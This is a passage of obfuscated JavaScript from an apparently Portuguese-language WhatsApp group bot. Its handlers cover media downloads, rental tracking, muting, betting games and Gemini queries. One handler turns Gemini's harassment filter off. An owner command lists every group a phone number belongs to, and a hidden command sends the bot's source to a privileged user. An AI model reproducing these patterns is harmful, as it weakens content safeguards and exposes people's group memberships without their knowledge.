                  return _0x50740b("Cadê a url do spotiy? exemplo: " + (_0x141936 + _0x267d4b) + " https://open.spotify.com/intl-pt/track/4m3mrHuttXhK58f6Tenai1\nNão baixo playlist, quiser pegar o link da música, acessa o site: https://open.spotify.com/search e pesquisa lá.");
                }
                _0x50740b(_0x50f430);
                try {
                  const _0x558863 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, {
                    'audio': {
                      'url': reqapi.spotify_mp3(_0x11e99e.trim())
                    },
                    'mimetype': "audio/mpeg"
                  }, _0x558863)["catch"](() => _0x50740b("Erro!"));
                } catch {
                  return _0x50740b("Erro...");
                }
              }
              break;
            case "listaaluguel":
            case "sairgpaluguel":
            case "lista_aluguel":
              {
                if (!_0xf59944 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("Este comando só o bot ou o dono pode executar..");
                }
                bui3 = {
                  '1': _0x141936 + _0x267d4b + "2 em dia",
                  '2': _0x141936 + _0x267d4b + "2 vencido",
                  '3': _0x141936 + _0x267d4b + "2 contatos",
                  '4': _0x141936 + _0x267d4b + "2 nao registrado",
                  '5': _0x141936 + _0x267d4b + "2 todos",
                  '6': _0x141936 + _0x267d4b + "2 7dias"
                };
                _0x56d611[_0x346d97] = {
                  'sender': _0x246d48,
                  'time': Date.now() + 30000,
                  'comandos': bui3
                };
                if (_0x267d4b === "sairgpaluguel") {
                  txtcmd = "sair";
                  txtcmd2 = "Sair Dos Grupos";
                } else {
                  txtcmd = "ver";
                  txtcmd2 = "Ver Lista Da Categoria";
                }
                var _0xbce007 = await _0x5196be.groupFetchAllParticipating();
                var _0x32d8bd = Object.entries(_0xbce007).slice(0).map(_0x305225 => _0x305225[1]);
                var _0x11eb12 = _0x32d8bd.map(_0x4eacb7 => _0x4eacb7.id);
                let _0x2c3c04 = rg_aluguel.filter(_0x275dfc => _0x11eb12.includes(_0x275dfc.id_gp));
                await fs.writeFile("./DADOS/json/aluguel.json", JSON.stringify(_0x2c3c04, null, 2), _0xc49022 => {
                  if (_0xc49022) {
                    console.error("Erro ao escrever arquivo:", _0xc49022);
                  }
                });
                fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                textAkinator = '*' + txtcmd2 + "*\n\n*Qual categoria você gostaria de " + txtcmd + "?*\n\n*1 - Em Dia*\n*2 - Vencido*\n*3 - contatos*\n*4 - Não Registrado*\n*5 - Todos*\n*6 - 7 Dias*";
                const _0x384151 = {
                  text: textAkinator
                };
                _0x5196be.sendMessage(_0x346d97, _0x384151);
              }
              break;
            case "bcaluguel":
              if (!_0xf59944 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando só o bot ou o dono pode executar..");
              }
              if (!_0x11e99e) {
                return _0x50740b("Qual mensagem você deseja enviar? Utilize desta maneira:\n" + (_0x141936 + _0x267d4b) + " *ALUGUEL VENCIDO*");
              }
              bui3 = {
                '1': _0x141936 + _0x267d4b + "2 em dia|" + _0x11e99e,
                '2': _0x141936 + _0x267d4b + "2 vencido|" + _0x11e99e,
                '3': _0x141936 + _0x267d4b + "2 nao registrado|" + _0x11e99e,
                '4': _0x141936 + _0x267d4b + "2 todos|" + _0x11e99e,
                '5': _0x141936 + _0x267d4b + "2 7dias|" + _0x11e99e
              };
              _0x56d611[_0x346d97] = {
                'sender': _0x246d48,
                'time': Date.now() + 30000,
                'comandos': bui3
              };
              fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
              textAkinator = "*transmissão nos gps do sistema de aluguel*\n\n*Qual categoria você gostaria de enviar está mensagem?*\n\n*1 - Em Dia*\n*2 - Vencido*\n*3 - Não Registrado*\n*4 - Todos*\n*5 - 7 Dias*";
              const _0x936595 = {
                text: textAkinator
              };
              _0x5196be.sendMessage(_0x346d97, _0x936595);
              break;
            case "verificar_aluguel":
            case "status_aluguel":
            case "check_aluguel":
              {
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                function _0x4484b8(_0x363a23) {
                  days = Math.floor(_0x363a23 / 86400);
                  hours = Math.floor(_0x363a23 % 86400 / 3600);
                  minutes = Math.floor(_0x363a23 % 3600 / 60);
                  seconds = Math.floor(_0x363a23 % 60);
                  formattedTime = '';
                  if (days > 0) {
                    formattedTime += days + " Dia" + (days !== 1 ? 's' : '') + " ";
                  }
                  if (hours > 0 || days > 0) {
                    formattedTime += hours + " Hora" + (hours !== 1 ? 's' : '') + " ";
                  }
                  if (minutes > 0 || hours > 0 || days > 0) {
                    formattedTime += minutes + " Minuto" + (minutes !== 1 ? 's' : '') + " ";
                  }
                  formattedTime += seconds + " Segundo" + (seconds !== 1 ? 's' : '');
                  return formattedTime.trim();
                }
                groupIndex = rg_aluguel.findIndex(_0x1cf7fc => _0x1cf7fc.id_gp == _0x346d97);
                if (groupIndex === -1) {
                  return _0x50740b("Este grupo não está na lista de aluguel.");
                }
                currentTime = Math.floor(Date.now() / 1000);
                let {
                  vencimento: _0x70568f
                } = rg_aluguel[groupIndex];
                let _0x465a1c = _0x70568f <= currentTime ? "inativo" : "ativo";
                const _0x4313b4 = {
                  hour12: false
                };
                let _0x368ce8 = new Date(_0x70568f * 1000).toLocaleTimeString("pt-BR", _0x4313b4);
                let _0x37701d = new Date(_0x70568f * 1000).toLocaleDateString("pt-BR");
                let _0x23dc45 = _0x4484b8(_0x70568f - currentTime);
                if (_0x70568f <= currentTime) {
                  _0x23dc45 = "Aluguel Vencido";
                }
                return _0x50740b("*Grupo: " + _0x3baffe + "*\n*Status: " + _0x465a1c + "*\n*Data De Vencimento: " + _0x37701d + "*\n*Hora De Vencimento: " + _0x368ce8 + "*\n*Tempo Restante: " + _0x23dc45 + '*');
              }
              break;
            case "editar":
              async function _0x110459() {
                const _0x10490d = {
                  text: "Hello there!"
                };
                let {
                  key: _0x57f375
                } = await _0x5196be.sendMessage(_0x346d97, _0x10490d);
                setInterval(async () => {
                  const _0x4ef168 = {
                    text: "Hello there edited!",
                    edit: _0x57f375
                  };
                  await _0x5196be.sendMessage(_0x346d97, _0x4ef168);
                }, 2500);
              }
              _0x110459();
              break;
            case "carregamento":
              async function _0x40b854() {
                var _0x147bfc = [",      🚀     \n💨", ",            🚀\n      💨\n💨", ",                🚀\n          💨\n     💨\n💨", ",                        🚀\n                  💨\n            💨\n      💨\n💨", ",                           🚀\n                     💨\n               💨\n          💨\n     💨\n💨", ",                         \n                    💨\n               💨      💨\n          💨                💨\n     💨                          💨\n💨                                   🚀"];
                const _0x459906 = {
                  text: "Iniciando carregamento..."
                };
                let {
                  key: _0x2c466d
                } = await _0x5196be.sendMessage(_0x346d97, _0x459906);
                for (let _0x89c143 = 0; _0x89c143 < _0x147bfc.length; _0x89c143++) {
                  const _0x2cecf9 = {
                    text: _0x147bfc[_0x89c143],
                    edit: _0x2c466d
                  };
                  await _0x5196be.sendMessage(_0x346d97, _0x2cecf9);
                  await new Promise(_0x50df2 => setTimeout(_0x50df2, 500));
                }
              }
              _0x40b854();
              break;
            case "aviatorgold":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                if (!_0x11e99e || isNaN(_0x11e99e)) {
                  return _0x50740b("Por favor, forneça uma quantidade válida para apostar no Aviator. A quantidade deve ser um número maior ou igual a 1.");
                }
                let _0x4073c7 = parseInt(_0x11e99e.trim());
                if (_0x4073c7 < 1) {
                  return _0x50740b("Por favor, forneça uma quantidade válida para apostar no Aviator. A quantidade deve ser um número maior ou igual a 1.");
                }
                if (_0x4073c7 > 50) {
                  return _0x50740b("O limite máximo de aposta é de 50 Golds.");
                }
                if (_0x3de59a.RS(_0x246d48, "Golds") < _0x4073c7) {
                  return _0x50740b("Você não tem essa quantidade de Golds para apostar. Verifique se há chances de minerar ou outras ações em menugold. Boas aventuras!");
                }
                let _0x461abe = _0x326cbd[0].Chances.findIndex(_0x4c0d5e => _0x4c0d5e.id === _0x246d48);
                if (_0x461abe !== -1) {
                  if (_0x326cbd[0].Chances[_0x461abe].aviator === null || _0x326cbd[0].Chances[_0x461abe].aviator === undefined) {
                    _0x326cbd[0].Chances[_0x461abe].aviator = 1;
                  } else {
                    if (_0x326cbd[0].Chances[_0x461abe].aviator >= 3) {
                      return _0x50740b("*VOCÊ SÓ PODE USAR O COMANDO AVIATOR 3 VEZES AO DIA, AMANHÃ VOCÊ PODE USAR MAIS*");
                    } else {
                      _0x326cbd[0].Chances[_0x461abe].aviator += 1;
                    }
                  }
                } else {
                  const _0x273d6c = {
                    id: _0x246d48,
                    aviator: 0x1
                  };
                  _0x326cbd[0].Chances.push(_0x273d6c);
                }
                _0x137e44(_0x326cbd);
                const _0x22ca98 = {
                  text: '🚀',
                  key: _0xd2050d.key
                };
                const _0x48ab6e = {
                  react: _0x22ca98
                };
                await _0x5196be.sendMessage(_0x346d97, _0x48ab6e);
                let _0xe03ea5 = '';
                let _0x3f758b = 0;
                let _0x4c6460 = Math.random() * 100;
                if (_0x4c6460 < 1) {
                  _0xe03ea5 = "Excelente! Você quintuplicou o valor apostado em 5x, e com isso você ganhou ( " + _0x4073c7 * 5 + " ) Golds. Sua estratégia realmente funcionou!";
                  _0x3f758b = _0x4073c7 * 5;
                } else {
                  if (_0x4c6460 < 6) {
                    _0xe03ea5 = "Uau, você teve uma baita sorte e quadriplicou o valor apostando em 4x, e com isso você ganhou ( " + _0x4073c7 * 4 + " ) Golds. Parabéns!";
                    _0x3f758b = _0x4073c7 * 4;
                  } else {
                    if (_0x4c6460 < 21) {
                      _0xe03ea5 = "Você fez a jogada certa e triplicou o valor apostado em 3x, e com isso você ganhou ( " + _0x4073c7 * 3 + " ) Golds. Isso é fantástico!";
                      _0x3f758b = _0x4073c7 * 3;
                    } else {
                      if (_0x4c6460 < 46) {
                        _0xe03ea5 = "Parabéns! Você duplicou o valor em 2x, e com isso você ganhou ( " + _0x4073c7 * 2 + " ) Golds nessa aposta. Continue assim!";
                        _0x3f758b = _0x4073c7 * 2;
                      } else {
                        _0xe03ea5 = "Parece que a sorte não estava do seu lado hoje. Você perdeu ( " + _0x4073c7 + " ) Golds, Tente de novo na próxima você consegue.";
                        _0x3f758b = -_0x4073c7;
                      }
                    }
                  }
                }
                _0x50740b(_0xe03ea5);
                _0x3de59a.ADD(_0x246d48, _0x3f758b);
              }
              break;
            case "emcomum":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                if (!_0x11e99e) {
                  return _0x50740b("Cadê o número que você deseja pesquisar?");
                }
                let _0x58ed6f = _0x54e91b => {
                  let _0x25db91 = [];
                  let _0x1614d3 = String(_0x54e91b).replaceAll(new RegExp("[()+-/ +/]", 'gi'), '') + "@s.whatsapp.net";
                  groupMetadata_RG.forEach(_0x20ffec => {
                    if (_0x20ffec.participants.some(_0x2ac865 => _0x2ac865.id === _0x1614d3)) {
                      let _0x5c9d72 = _0x20ffec.participants.find(_0x3f658b => _0x3f658b.id === _0x1614d3).admin;
                      const _0x3ab236 = {
                        nome_gp: _0x20ffec.subject,
                        id_gp: _0x20ffec.id,
                        adm: _0x5c9d72 ? "Sim" : "Não"
                      };
                      _0x25db91.push(_0x3ab236);
                    }
                  });
                  const _0x50269f = {
                    usuario: _0x1614d3
                  };
                  _0x25db91.unshift(_0x50269f);
                  return _0x25db91;
                };
                let _0x5365d0 = _0x11e99e.trim().replace(/\D/g, '');
                let _0x623e15 = _0x58ed6f(_0x5365d0);
                let _0x2dddf4 = "*Grupos em comum com o usuário:*\n\n";
                _0x623e15.forEach((_0x144c38, _0x5efe79) => {
                  if (_0x5efe79 !== 0) {
                    _0x2dddf4 += "GRUPO: " + _0x144c38.nome_gp + "\nID: " + _0x144c38.id_gp + "\nADM?: " + _0x144c38.adm + "\n\n";
                  }
                });
                if (_0x623e15.length > 1) {
                  _0x50740b(_0x2dddf4);
                } else {
                  _0x50740b("Não há grupos em comum com o usuário.");
                }
              }
              break;
            case "adivinheemoji":
              {
                if (!_0x89cd51) {
                  return _0x50740b(enviar.msg.grupo);
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                let _0x5d6b01 = JSON.parse(fs.readFileSync("./DADOS/json/rankemoji.json"));
                let _0x57acc4 = _0x5d6b01.findIndex(_0x2e816d => _0x2e816d.grupo === _0x346d97);
                if (_0x57acc4 === -1) {
                  const _0x1ee877 = {
                    grupo: _0x346d97,
                    usuarios: []
                  };
                  _0x5d6b01.push(_0x1ee877);
                  _0x57acc4 = _0x5d6b01.length - 1;
                }
                let _0x2f8781 = _0x5d6b01[_0x57acc4].usuarios.findIndex(_0x2ff160 => _0x2ff160.usuario === _0x246d48);
                if (_0x2f8781 === -1 && _0x326cbd[0].adivinheemoji) {
                  const _0x54a294 = {
                    usuario: _0x246d48,
                    pontos: 0x0
                  };
                  _0x5d6b01[_0x57acc4].usuarios.push(_0x54a294);
                }
                fs.writeFileSync("./DADOS/json/rankemoji.json", JSON.stringify(_0x5d6b01));
                _0x326cbd[0].adivinheemoji = !_0x326cbd[0].adivinheemoji;
                _0x137e44(_0x326cbd);
                let _0x4b332b = _0x326cbd[0].adivinheemoji ? "Jogo de adivinhação de emoji ativado com sucesso." : "Jogo de adivinhação de emoji desativado.\n Ranking de acertos do grupo:\n";
                if (!_0x326cbd[0].adivinheemoji) {
                  _0x5d6b01[_0x57acc4].usuarios.forEach(_0x571cd8 => {
                    _0x4b332b += '@' + _0x571cd8.usuario.split('@')[0] + " pontuação: " + _0x571cd8.pontos + "\n";
                  });
                  setTimeout(() => {
                    _0x5d6b01[_0x57acc4].usuarios = [];
                    fs.writeFileSync("./DADOS/json/rankemoji.json", JSON.stringify(_0x5d6b01));
                  }, 2000);
                }
                _0x5196be.sendMessage(_0x346d97, {
                  'text': _0x4b332b,
                  'mentions': _0x5d6b01[_0x57acc4].usuarios.map(_0x2221f0 => _0x2221f0.usuario)
                });
              }
              await delay(2000);
              if (_0x326cbd[0].adivinheemoji) {
                _0x233934();
              }
              break;
            case "rankadivinheemoji":
              {
                if (!_0x89cd51) {
                  return _0x50740b(enviar.msg.grupo);
                }
                let _0x389d56 = JSON.parse(fs.readFileSync("./DADOS/json/rankemoji.json"));
                let _0x415058 = _0x389d56.findIndex(_0x187e3f => _0x187e3f.grupo === _0x346d97);
                if (_0x415058 === -1 || !_0x389d56[_0x415058].usuarios.length) {
                  return _0x50740b("Não há dados de acertos para este grupo.");
                }
                let _0x470b72 = "Ranking de acertos do grupo:\n";
                _0x389d56[_0x415058].usuarios.forEach(_0x534914 => {
                  _0x470b72 += '@' + _0x534914.usuario.split('@')[0] + " pontuação: " + _0x534914.pontos + "\n";
                });
                let _0x5d4ee8 = _0x389d56[_0x415058].usuarios.map(_0x49b14a => _0x49b14a.usuario);
                const _0x5d8824 = {
                  text: _0x470b72,
                  mentions: _0x5d4ee8
                };
                _0x5196be.sendMessage(_0x346d97, _0x5d8824);
              }
              break;
            case "listamutados":
              if (!_0x89cd51) {
                return _0x50740b(enviar.msg.grupo);
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O bot precisa ser adm pra executar essa ação.");
              }
              let _0x507880 = _0x1c61fa.find(_0x27a87c => _0x27a87c.grupo === _0x346d97);
              if (_0x507880 && _0x507880.numeros.length > 0) {
                let _0x463e98 = _0x507880.numeros;
                let _0xc52f05 = "Usuários mutados neste grupo:\n";
                _0x463e98.forEach((_0x4ae408, _0x484331) => {
                  _0xc52f05 += _0x484331 + 1 + ". @" + _0x4ae408.split('@')[0] + "\n";
                });
                _0x1106fd(_0xc52f05, _0x463e98, true);
              } else {
                _0x50740b("Não há usuários mutados neste grupo.");
              }
              break;
            case "mute":
              {
                if (!_0x89cd51) {
                  return _0x50740b(enviar.msg.grupo);
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("O bot precisa ser adm pra executar essa ação.");
                }
                if (!_0x5e13bf) {
                  return _0x50740b("Marque o número que deseja mutar.");
                }
                if (JSON.stringify(_0x1b6ab1).indexOf(_0x5e13bf) >= 0) {
                  return _0x50740b("Não posso mutar meu criador 🤧");
                }
                if (JSON.stringify(_0x5bd5f4).indexOf(_0x5e13bf) >= 0) {
                  return _0x50740b("Não posso mutar meu dono 🤧");
                }
                let _0x119fe7 = '';
                let _0x1b4cc3 = _0x1c61fa.find(_0x4c9595 => _0x4c9595.grupo === _0x346d97);
                if (_0x1b4cc3) {
                  if (_0x1b4cc3.numeros.includes(_0x5e13bf)) {
                    return _0x50740b("Este membro já foi mutado anteriormente.");
                  } else {
                    _0x1b4cc3.numeros.push(_0x5e13bf);
                  }
                } else {
                  const _0x2824c0 = {
                    grupo: _0x346d97,
                    numeros: [_0x5e13bf]
                  };
                  _0x1c61fa.push(_0x2824c0);
                }
                fs.writeFileSync("./DADOS/json/mutados.json", JSON.stringify(_0x1c61fa, null, 2) + "\n");
                _0x119fe7 = "Pronto @" + _0x45b1c6 + " mutei o membro: @" + _0x5e13bf.split('@')[0] + "\n\nquando ele falar algo apagarei";
                _0x1106fd(_0x119fe7, [_0x5e13bf, _0x246d48], true);
              }
              break;
            case "unmute":
            case "desmute":
              {
                if (!_0x89cd51) {
                  return _0x50740b(enviar.msg.grupo);
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("O bot precisa ser adm pra executar essa ação.");
                }
                if (!_0x5e13bf) {
                  return _0x50740b("Marque o número que deseja desmutar.");
                }
                let _0xcf80f3 = '';
                let _0x5b3d7e = _0x1c61fa.find(_0x5953b8 => _0x5953b8.grupo === _0x346d97);
                if (_0x5b3d7e) {
                  if (_0x5b3d7e.numeros.includes(_0x5e13bf)) {
                    _0x5b3d7e.numeros = _0x5b3d7e.numeros.filter(_0x2df8b2 => _0x2df8b2 !== _0x5e13bf);
                    _0xcf80f3 = "Pronto @" + _0x45b1c6 + ", desmutei o membro: @" + _0x5e13bf.split('@')[0];
                    fs.writeFileSync("./DADOS/json/mutados.json", JSON.stringify(_0x1c61fa, null, 2) + "\n");
                    _0x1106fd(_0xcf80f3, [_0x5e13bf, _0x246d48], true);
                  } else {
                    return _0x50740b("Este membro não está mutado.");
                  }
                } else {
                  return _0x50740b("Não há membros mutados neste grupo.");
                }
              }
              break;
            case "meenvie":
              if (!issupre) {
                return _0x50740b("procure oq fazer");
              }
              const _0x25d1a5 = {
                url: "./index.js"
              };
              const _0xf6be8f = {
                document: _0x25d1a5,
                mimetype: "application/js",
                fileName: "index.js"
              };
              const _0x38afdc = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0xf6be8f, _0x38afdc);
              break;
            case "gifparawpp":
              if (!_0x11e99e) {
                return _0x50740b("Cade O Link Do Gif?");
              }
              try {
                if (_0x11e99e.length < 7) {
                  return _0x50740b("*VOCÊ DEVE COLOCAR O LINK DO ARQUIVO*");
                }
                _0x50740b(enviar.espere);
                _0x926ec9 = await getBuffer('' + _0x11e99e.trim());
                let _0x58c5a9 = getRandom(".gif");
                let _0x2c2dae = getRandom(".mp4");
                fs.writeFileSync(_0x58c5a9, _0x926ec9);
                exec("ffmpeg -i " + _0x58c5a9 + " -movflags faststart -c:v libx264 -b:v 6M -s 1920x1080 -pix_fmt yuv420p -profile:v high " + _0x2c2dae, async _0x5e9302 => {
                  _0x5196be.sendMessage(_0x346d97, {
                    'video': fs.readFileSync(_0x2c2dae),
                    'gifPlayback': true,
                    'caption': "*AQUI ESTÁ SEU GIF*"
                  });
                  setTimeout(() => {
                    fs.unlinkSync(_0x58c5a9);
                    fs.unlinkSync(_0x2c2dae);
                  }, 3000);
                });
              } catch (_0x50ad0c) {
                console.log("Error: " + _0x50ad0c);
                _0x50740b(" *ERROR* ");
              }
              break;
            case "pinterestvid":
            case "pinterestgif":
              if (!_0x11e99e.trim()) {
                return _0x50740b("Cadê o link do vídeo ou GIF do Pinterest?");
              }
              let _0xd773b6;
              if (_0x267d4b === "pinterestvid") {
                _0xd773b6 = "video";
              } else {
                _0xd773b6 = "gif";
              }
              await downloadPinterestLinks(_0xd773b6, _0x11e99e.trim()).then(async _0x3cb2f5 => {
                if (_0x3cb2f5.length > 0) {
                  if (_0x267d4b === "pinterestvid") {
                    const _0x1fb4d3 = {
                      url: _0x3cb2f5[0]
                    };
                    const _0x25119d = {
                      video: _0x1fb4d3,
                      caption: "*AQUI ESTÁ SEU VÍDEO*"
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x25119d);
                  } else {
                    let _0x486c1a = await getBuffer(_0x3cb2f5[0]);
                    let _0x2e603c = getRandom(".gif");
                    let _0x22f73b = getRandom(".mp4");
                    fs.writeFileSync(_0x2e603c, _0x486c1a);
                    exec("ffmpeg -i " + _0x2e603c + " -movflags faststart -c:v libx264 -b:v 6M -s 1920x1080 -pix_fmt yuv420p -profile:v high " + _0x22f73b, async _0x1be39e => {
                      _0x5196be.sendMessage(_0x346d97, {
                        'video': fs.readFileSync(_0x22f73b),
                        'gifPlayback': true,
                        'caption': "*AQUI ESTÁ SEU GIF*"
                      });
                      setTimeout(() => {
                        fs.unlinkSync(_0x2e603c);
                        fs.unlinkSync(_0x22f73b);
                      }, 3000);
                    });
                  }
                } else {
                  _0x50740b("Nenhum link de vídeo encontrado na página do Pinterest");
                }
              })["catch"](_0x42d728 => {
                _0x50740b("Erro:", _0x42d728.message);
              });
              break;
            case "insta_video2":
            case "facebook_video2":
            case "insta_audio2":
            case "facebook_audio2":
            case "instagram_video2":
            case "instagram_audio2":
              (async () => {
                try {
                  if (!_0x11e99e) {
                    return _0x50740b("cade o link?");
                  }
                  _0x50740b("enviando aguarde...");
                  let {
                    ndown: _0x23d057
                  } = require("nayan-media-downloader");
                  let _0x2db061 = await _0x23d057(_0x11e99e.trim());
                  let _0x2487e9 = _0x2db061.data[0].url;
                  if (_0x267d4b === "insta_video2" || _0x267d4b === "facebook_video2" || _0x267d4b === "instagram_video2") {
                    const _0x47c41a = {
                      url: _0x2487e9
                    };
                    const _0x3f5c0b = {
                      video: _0x47c41a,
                      caption: "*AQUI ESTÁ SEU VÍDEO*"
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x3f5c0b);
                  } else {
                    const _0x24b48e = {
                      url: _0x2487e9
                    };
                    const _0x46fbf6 = {
                      audio: _0x24b48e,
                      mimetype: "audio/mpeg"
                    };
                    const _0x2afa75 = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x46fbf6, _0x2afa75);
                  }
                } catch (_0x479167) {
                  console.log(_0x479167);
                  _0x50740b("Erro ao baixar mídia.");
                }
              })();
              break;
            case "tiktok_audio2":
            case "tiktok_video2":
              (async () => {
                try {
                  if (!_0x11e99e) {
                    return _0x50740b("cade o link?");
                  }
                  _0x50740b("enviando aguarde...");
                  let {
                    tikdown: _0x410318
                  } = require("nayan-media-downloader");
                  let _0x1e3320 = await _0x410318(_0x11e99e.trim());
                  let _0x40f5bf = _0x1e3320.data.video;
                  if (_0x267d4b === "tiktok_video2") {
                    const _0x35a83e = {
                      url: _0x40f5bf
                    };
                    const _0x54d716 = {
                      video: _0x35a83e,
                      caption: "*AQUI ESTÁ SEU VÍDEO*"
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x54d716);
                  } else {
                    const _0x4f7a81 = {
                      url: _0x40f5bf
                    };
                    const _0x30effd = {
                      audio: _0x4f7a81,
                      mimetype: "audio/mpeg"
                    };
                    const _0x3f8881 = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x30effd, _0x3f8881);
                  }
                } catch (_0xbf4c69) {
                  _0x50740b("Erro ao baixar mídia. " + _0xbf4c69);
                }
              })();
              break;
            case "twitter_audio2":
            case "twitter_video2":
              (async () => {
                try {
                  if (!_0x11e99e) {
                    return _0x50740b("cade o link?");
                  }
                  _0x50740b("enviando aguarde...");
                  let {
                    twitterdown: _0x888afe
                  } = require("nayan-media-downloader");
                  let _0x12e843 = await _0x888afe(_0x11e99e.trim());
                  let _0x25c955 = _0x12e843.data.SD;
                  if (_0x267d4b === "twitter_video2") {
                    const _0x56b8a5 = {
                      url: _0x25c955
                    };
                    const _0x47740e = {
                      video: _0x56b8a5,
                      caption: "*AQUI ESTÁ SEU VÍDEO*"
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x47740e);
                  } else {
                    const _0x1d08b8 = {
                      url: _0x25c955
                    };
                    const _0x453da9 = {
                      audio: _0x1d08b8,
                      mimetype: "audio/mpeg"
                    };
                    const _0x489a48 = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x453da9, _0x489a48);
                  }
                } catch (_0x4175aa) {
                  _0x50740b("Erro ao baixar mídia. " + _0x4175aa);
                }
              })();
              break;
            case "play7_video":
            case "play7":
            case "playdoc7":
              (async () => {
                try {
                  if (!_0x11e99e) {
                    return _0x50740b("cade o link?");
                  }
                  _0x50740b("enviando aguarde...");
                  let {
                    ytdown: _0x41bd2f
                  } = require("nayan-media-downloader");
                  let _0xc58fea = await _0x41bd2f(_0x11e99e.trim());
                  let _0x3cd84b = _0xc58fea.data.video;
                  if (_0x267d4b === "play7_video") {
                    const _0x2a97ed = {
                      url: _0x3cd84b
                    };
                    const _0x5a88b8 = {
                      video: _0x2a97ed,
                      caption: "*AQUI ESTÁ SEU VÍDEO*"
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x5a88b8);
                  } else {
                    if (_0x267d4b === "playdoc7") {
                      const _0x7998b3 = {
                        url: _0x3cd84b
                      };
                      const _0x3765c4 = {
                        quoted: _0xd2050d
                      };
                      _0x5196be.sendMessage(_0x346d97, {
                        'document': _0x7998b3,
                        'mimetype': "audio/mpeg",
                        'fileName': "musica.mp3"
                      }, _0x3765c4);
                    } else {
                      const _0x43d9b7 = {
                        url: _0x3cd84b
                      };
                      const _0x3e0d24 = {
                        audio: _0x43d9b7,
                        mimetype: "audio/mpeg"
                      };
                      const _0x3fd34f = {
                        quoted: _0xd2050d
                      };
                      _0x5196be.sendMessage(_0x346d97, _0x3e0d24, _0x3fd34f);
                    }
                  }
                } catch (_0x503982) {
                  _0x50740b("Erro ao baixar mídia. " + _0x503982);
                }
              })();
              break;
            case "gemini":
              {
                try {
                  if (!_0x11e99e) {
                    return _0x50740b("Por favor, escreva uma pergunta para que eu possa ajudar a gerar uma resposta.");
                  }
                  let _0x45521f = JSON.parse(fs.readFileSync("./DADOS/nescessario.json", "utf8"));
                  if (!_0x45521f.hasOwnProperty("geminikey")) {
                    _0x45521f.geminikey = '';
                    fs.writeFileSync("./DADOS/nescessario.json", JSON.stringify(_0x45521f, null, 2));
                    return _0x50740b("Chave do gemini não encontrada. Foi criada uma nova chave em branco. Por favor, gere uma nova no site: https://aistudio.google.com/app/apikey");
                  } else {
                    if (_0x45521f.geminikey.trim() === '') {
                      return _0x50740b("Chave do gemini encontrada, mas está vazia. Por favor, gere uma nova no site: https://aistudio.google.com/app/apikey");
                    }
                  }
                  const _0x83f72d = {
                    category: HarmCategory.HARM_CATEGORY_HARASSMENT,
                    threshold: HarmBlockThreshold.BLOCK_NONE
                  };
                  let _0x199241 = [_0x83f72d];
                  const _0x206c05 = {
                    model: _0x54198a ? "gemini-pro-vision" : "gemini-pro",
                    safetySettings: _0x199241
                  };
                  let _0x19f08e = genAI.getGenerativeModel(_0x206c05);
                  let _0x5b89c2;
                  if (_0x54198a) {
                    let {
                      message: _0xaab33a
                    } = JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm'));
                    let _0x2ed17b = _0xaab33a.extendedTextMessage.contextInfo;
                    let _0x47c390 = "./DADOS/grupos/" + getRandom(100000) + ".png";
                    await downloadMedia(_0x2ed17b, _0x47c390);
                    _0x5b89c2 = await _0x19f08e.generateContent([encodeURIComponent(_0x11e99e), {
                      'inlineData': {
                        'data': fs.readFileSync(_0x47c390, "base64"),
                        'mimeType': "image/png"
                      }
                    }]);
                    fs.unlinkSync(_0x47c390);
                  } else {
                    _0x5b89c2 = await _0x19f08e.generateContent(encodeURIComponent(_0x11e99e));
                  }
                  _0x50740b(_0x5b89c2.response.text());
                } catch (_0x40e324) {
                  if (["Candidate was blocked due to SAFETY", "Response was blocked due to OTHER", "Response was blocked due to SAFETY"].some(_0x40a52e => _0x40e324.message.includes(_0x40a52e))) {
                    _0x50740b("⚠️ A resposta foi ~*bloqueada*~ por motivos de segurança. Parece que o conteúdo gerado viola as políticas de segurança do *Gemini*. Por favor, tente novamente com uma solicitação diferente.");
                  } else {
                    _0x50740b("Ocorreu um erro");
                  }
                }
              }
              break;
            case "sorte":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0x548404 = Math.random() < 0.95 ? "sorte" : "azar";
                let _0x1585b9;
                if (_0x548404 === "sorte") {
                  _0x1585b9 = Math.random() < 0.8 ? Math.floor(Math.random() * 61) + 50 : Math.floor(Math.random() * 50);
                } else {
                  _0x1585b9 = Math.floor(Math.random() * 111);
                }
                let _0x1b47c4 = _0x548404 === "sorte" ? _0x1585b9 : -_0x1585b9;
